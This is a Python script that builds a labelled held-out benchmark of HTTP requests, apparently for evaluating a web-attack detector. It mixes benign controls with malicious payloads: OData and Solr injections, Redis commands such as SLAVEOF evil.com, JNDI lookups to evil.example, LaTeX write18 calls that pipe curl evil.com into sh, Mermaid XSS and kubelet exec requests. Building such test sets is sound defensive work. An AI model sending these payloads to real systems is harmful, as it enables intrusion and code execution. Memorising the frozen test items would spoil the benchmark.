#!/usr/bin/env python3
"""Generate heldout_v10.jsonl — clean held-out batch v10.

Families structurally absent from ALL v1-v9 tuning corpora: OData query
injection, Solr/Lucene query syntax, Redis inline protocol, IMAP/POP3
commands, XML-RPC, JNDI remote lookup injection, LaTeX injection, Mermaid
diagram injection, Prometheus/Grafana API abuse, and container/K8s
socket API exposure.
"""
import json, hashlib

OUT = "benchmarks/real_comparative/corpus/heldout_v10.jsonl"

ATTACKS = {
 "odata_injection": [
  ("GET","/api/items","$filter=Name eq 'x' or 1 eq 1",""),
  ("GET","/api/items","$filter=substringof('a',Name)",""),
  ("GET","/api/items","$filter=cast(Price,Edm.String) eq 'x'",""),
  ("GET","/api/items","$expand=Orders($filter=Total gt 0;$top=1)",""),
  ("GET","/api/items","$apply=groupby((Category),aggregate(Amount with sum as Total))",""),
  ("GET","/api/items","$filter=Name eq 'x'; DROP TABLE users--",""),
  ("GET","/api/items","$filter=not (Name eq null) and Price lt 0 or 1 eq 1",""),
  ("GET","/api/items","$search=%22secret%22&$filter=contains(Notes,'pass')",""),
 ],
 "solr_lucene": [
  ("GET","/solr/select","q=*:*&rows=10000&fl=id,name,secret",""),
  ("GET","/solr/select","q={!term f=secret}value&defType=lucene",""),
  ("GET","/solr/select","q=name:(a OR b) AND password:*&q.op=AND",""),
  ("GET","/solr/select","q={!func}ms(NOW,validFrom)&sort=score desc",""),
  ("GET","/solr/select","q=id:1&_query_=%7B!join%20from%3Dsecret%20to%3Did%7Dsecret:*",""),
  ("GET","/solr/select","q=*:*&shards=localhost:8983/solr,evil.com:8983/solr",""),
  ("GET","/solr/select","q={!collapse field=tenant}&fq=tenant:admin",""),
  ("GET","/solr/select","q={!frange l=1 u=1000}price&debugQuery=true",""),
 ],
 "redis_proto": [
  ("GET","/","","*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nvalue"),
  ("GET","/","","CONFIG SET dir /var/www/html\r\n"),
  ("GET","/","","EVAL \"return redis.call('set','k','v')\" 0\r\n"),
  ("GET","/","","MODULE LOAD /tmp/evil.so\r\n"),
  ("GET","/","","SLAVEOF evil.com 6379\r\n"),
  ("GET","/","","FLUSHALL\r\nDEBUG SLEEP 10\r\n"),
 ],
 "imap_pop3": [
  ("GET","/mail","","A001 LOGIN admin password\r\nA002 SELECT INBOX\r\nA003 STORE 1 +FLAGS (\\Deleted)"),
  ("GET","/mail","","USER admin\r\nPASS password\r\nRETR 1\r\nDELE 1\r\nQUIT"),
  ("GET","/mail","","a001 LOGIN {13}\r\nadmin@example.com password"),
  ("GET","/mail","","CAPABILITY\r\nSTARTTLS\r\nLOGIN admin pass"),
  ("GET","/mail","","LIST \"\" *\r\nFETCH 1 (BODY[HEADER.FIELDS (FROM SUBJECT)])"),
  ("GET","/mail","","STAT\r\nLIST\r\nRETR 1\r\nNOOP\r\nQUIT"),
 ],
 "xmlrpc": [
  ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>system.exec</methodName><params><param><value><string>id</string></value></param></params></methodCall>'),
  ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>pass</string></value></param></params></methodCall>'),
  ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com/x</string></value></param><param><value><string>http://victim.com/post</string></value></param></params></methodCall>'),
  ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>mt.setPostTitle</methodName><params><param><value><int>1</int></value></param><param><value><string>title</string></value></param><param><value><string>new</string></value></param></params></methodCall>'),
  ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>'),
  ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>wp.uploadFile</methodName><params><param><value><int>1</int></value></param><param><value><string>admin</string></value></param><param><value><string>pass</string></value></param><param><value><base64>/etc/passwd</base64></value></param></params></methodCall>'),
 ],
 "jndi_injection": [
  ("GET","/api","x=${jndi:ldap://evil.example/a}",""),
  ("GET","/api","x=${jndi:rmi://evil.example:1099/a}",""),
  ("GET","/api","x=${jndi:dns://evil.example/a}",""),
  ("GET","/api","x=${jndi:iiop://evil.example/a}",""),
  ("GET","/api","x=${jndi:corba:iiop:evil.example:1050/NameService#x}",""),
  ("GET","/api","x=${jndi:ldap://127.0.0.1:1389/a}",""),
  ("GET","/api","x=ldap://evil.example:1389/a",""),
  ("GET","/api","x=rmi://evil.example:1099/Exploit",""),
 ],
 "latex_injection": [
  ("POST","/render","",'{"tex":"\\\\write18{curl evil.com|sh}\\\\bye"}'),
  ("POST","/render","",'{"tex":"\\\\input{/etc/passwd}"}'),
  ("POST","/render","",'{"tex":"\\\\includegraphics{/etc/passwd}"}'),
  ("POST","/render","",'{"tex":"\\\\immediate\\\\write18{wget evil.com/shell.sh}"}'),
  ("POST","/render","",'{"tex":"\\\\openout\\\\file=/var/www/html/shell.php"}'),
  ("POST","/render","",'{"tex":"\\\\read18to\\\\inst"}'),
  ("POST","/render","",'{"tex":"\\\\special{! /bin/sh -c id}"}'),
  ("POST","/render","",'{"tex":"\\\\catcode`\\\\active=13 \\\\def\\\\{evil}"}'),
 ],
 "mermaid_injection": [
  ("POST","/diagram","",'{"code":"graph TD; A-->B; click A call evil()","securityLevel":"loose"}'),
  ("POST","/diagram","",'{"code":"graph TD; click B \"javascript:alert(1)\"","securityLevel":"loose"}'),
  ("POST","/diagram","",'{"code":"%%{init: {\"themeVariables\": {\"fontFamily\": \"x\"}}}%%\ngraph TD; A-->B","securityLevel":"antiscript"}'),
  ("POST","/diagram","",'{"code":"sequenceDiagram; participant A as <img src=x onerror=alert(1)>; A->>B: hi","securityLevel":"antiscript"}'),
  ("POST","/diagram","",'{"code":"graph LR; A[\"<script>alert(1)</script>\"]-->B","securityLevel":"antiscript"}'),
  ("POST","/diagram","",'{"code":"flowchart TD; A-->|\"javascript:fetch(evil.com)\"|B","securityLevel":"antiscript"}'),
 ],
 "prometheus_grafana": [
  ("GET","/api/v1/query","query=up{job=\"x\"}",""),
  ("POST","/api/v1/write","",'{"streams":[{"labels":{"__name__":"x"},"values":[[0,"1"]]}]}'),
  ("GET","/api/v1/alerts","",""),
  ("GET","/api/alertmanager/api/v1/alerts","",""),
  ("POST","/api/alertmanager/api/v2/silences","",'{"matchers":[{"name":"alertname","value":"x","isRegex":true}]}'),
  ("GET","/api/datasources","",""),
 ],
 "container_k8s_api": [
  ("GET","/var/run/docker.sock","",""),
  ("GET","/.dockerenv","",""),
  ("GET","/proc/1/cgroup","",""),
  ("GET","/kubelet/pods","",""),
  ("GET","/kubelet/log?pod=default%2Fnginx-abc&container=nginx","",""),
  ("GET","/kubelet/exec?pod=default%2Fnginx-abc&container=nginx&command=id","",""),
  ("GET","/kubelet/run?pod=default%2Fnginx-abc&container=nginx","",""),
  ("GET","/kubelet/portforward?pod=default%2Fnginx-abc&port=8080","",""),
 ],
}

BENIGN = [
 ("GET","/api/items","$filter=Name%20eq%20%27widget%27",""),
 ("GET","/api/items","$select=Id,Name&$top=10",""),
 ("GET","/api/items","$orderby=Name%20asc&$skip=0",""),
 ("GET","/api/items","$count=true&$inlinecount=allpages",""),
 ("GET","/api/items","category=books&sort=-price",""),
 ("GET","/solr/select","q=red+shoes&rows=20",""),
 ("GET","/solr/select","q=brand:Nike&fq=inStock:true&sort=price+asc",""),
 ("GET","/solr/select","q=memory+foam&defType=edismax&qf=name+description",""),
 ("GET","/solr/select","q=title:%22star+wars%22&fl=id,title&wt=json",""),
 ("GET","/mail","","A001 LOGIN user@example.com pass123\r\nA002 SELECT INBOX\r\nA003 FETCH 1 (BODY.PEEK[])",),
 ("GET","/mail","","USER user@example.com\r\nPASS pass123\r\nLIST\r\nQUIT"),
 ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>blogger.getUsersBlogs</methodName><params><param><value><string>user</string></value></param><param><value><string>pass</string></value></param></params></methodCall>'),
 ("POST","/xmlrpc","",'<?xml version="1.0"?><methodCall><methodName>wp.getPosts</methodName><params><param><value><int>1</int></value></param><param><value><string>admin</string></value></param><param><value><string>pass</string></value></param><param><value><int>10</int></value></param></params></methodCall>'),
 ("GET","/api","next=/dashboard",""),
 ("GET","/api","redirect=https%3A%2F%2Fexample.com%2Fhome",""),
 ("POST","/render","",'{"tex":"E=mc^2 and x^2+y^2=z^2"}'),
 ("POST","/render","",'{"tex":"The equation \\\\(a+b\\\\)^2 = a^2 + 2ab + b^2\\\\) holds."}'),
 ("POST","/diagram","",'{"code":"graph TD; A[Start]-->B{Decision}; B-->|Yes|C[End]; B-->|No|D[Loop]","securityLevel":"strict"}'),
 ("POST","/diagram","",'{"code":"sequenceDiagram; Alice->>Bob: Hello; Bob-->>Alice: Hi","securityLevel":"strict"}'),
 ("GET","/api/v1/query","query=up&time=2024-01-01T00:00:00Z",""),
 ("GET","/api/v1/query_range","query=rate(http_requests_total[5m])&start=1704067200&end=1704153600&step=15s",""),
 ("GET","/api/health","",""),
 ("GET","/metrics","",""),
 ("GET","/status","",""),
 ("GET","/api/status","",""),
 ("POST","/api/items","",'{"name":"Widget","price":9.99,"category":"tools"}'),
 ("POST","/api/search","",'{"q":"latex formula editor","format":"pdf"}'),
 ("GET","/search","q=redis+tutorial",""),
 ("GET","/search","q=imap+vs+pop3",""),
 ("GET","/search","q=xmlrpc+explained",""),
 ("GET","/search","q=jndi+lookup+java",""),
 ("GET","/search","q=mermaid+diagram+syntax",""),
 ("GET","/search","q=prometheus+query+language",""),
 ("GET","/docs","page=3",""),
 ("GET","/api/v1/users","limit=25&offset=50",""),
 ("GET","/api/v1/users","fields=id,name,email",""),
 ("POST","/api/comments","",'{"text":"Great article about OData!","author":"reader1"}'),
 ("POST","/api/comments","",'{"text":"Solr is powerful for full-text search","author":"dev2"}'),
 ("GET","/static/app.js","",""),
 ("GET","/static/style.css","",""),
 ("GET","/favicon.ico","",""),
 ("GET","/robots.txt","",""),
 ("HEAD","/api/status","",""),
 ("OPTIONS","/api/items","",""),
]

def mk(case_id, cat, label, note, method, path, query, body, headers=None, split="held_out"):
    return {
        "case_id": case_id, "category": cat, "corpus": "heldout_v10",
        "corpus_sha256": None, "corpus_version": None,
        "label": label, "note": note,
        "request": {"body": body, "headers": headers or {}, "method": method,
                    "path": path, "query": query},
        "split": split,
        "split_reason": ("Frozen held-out batch v10: techniques absent from v1-v9 tuning."
                         if label == "malicious" else "Benign control written independently of engine internals."),
    }

notes = {c: f"v10 fresh techniques for {c}." for c in ATTACKS}
notes["benign"] = "Benign control v10."

cases=[]
for cat,payloads in ATTACKS.items():
    for i,(m,p,q,b,*rest) in enumerate(payloads):
        cases.append(mk(f"heldout_v10/{cat}-{i:02d}",cat,"malicious",notes[cat],m,p,q,b,rest[0] if rest else {}))
for i,(m,p,q,b,*rest) in enumerate(BENIGN):
    cases.append(mk(f"heldout_v10/benign-{i:03d}","benign","benign",notes["benign"],m,p,q,b,rest[0] if rest else {}))

with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in cases: f.write(json.dumps(c,ensure_ascii=False)+"\n")
lines=[json.loads(l) for l in open(OUT,encoding="utf-8")]
sha=hashlib.sha256(open(OUT,"rb").read()).hexdigest()
for c in lines: c["corpus_sha256"]=sha
with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in lines: f.write(json.dumps(c,ensure_ascii=False)+"\n")
mal=[c for c in cases if c["label"]=="malicious"]; ben=[c for c in cases if c["label"]=="benign"]
print(f"wrote {len(cases)} cases -> {OUT}")
print(f"malicious={len(mal)} benign={len(ben)} sha256={sha[:16]}")
from collections import Counter
print(Counter(c["category"] for c in mal))
